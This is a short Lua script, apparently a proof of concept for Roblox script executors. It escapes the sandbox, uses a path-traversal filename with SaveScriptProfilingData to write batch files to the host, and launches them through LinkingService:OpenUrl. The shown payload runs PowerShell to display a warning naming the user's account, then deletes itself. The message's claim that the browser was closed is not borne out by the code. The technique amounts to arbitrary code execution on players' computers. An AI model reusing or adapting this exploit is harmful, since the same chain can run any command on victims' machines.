setfenv(1, getfenv(require))
getfenv().game = nil

local LinkingService = game:GetService("LinkingService")
local ScriptContext = game:GetService("ScriptContext")

local messageBoxScript = [[
powershell -Command "Add-Type -AssemblyName PresentationFramework; 
$pcUsername = [System.Environment]::UserName; 
[System.Windows.MessageBox]::Show('Hello ' + $pcUsername + ', you just ran a script that exploited a vulnerability in your executor. Luckily for you, I won''t be causing any harm. To scare you, I have closed your browser to show what is possible. Please be careful what scripts you execute. Have a great day.');"
]]

local messageBoxPayload = ScriptContext:SaveScriptProfilingData(messageBoxScript, "../../../../message_box.bat")
LinkingService:OpenUrl(messageBoxPayload)

local cleanupScript = [[
@echo off
timeout /t 3 > nul
del /f /q "../../../../message_box.bat"
]]
local cleanupPayload = ScriptContext:SaveScriptProfilingData(cleanupScript, "../../../../cleanup.bat")

LinkingService:OpenUrl(cleanupPayload)
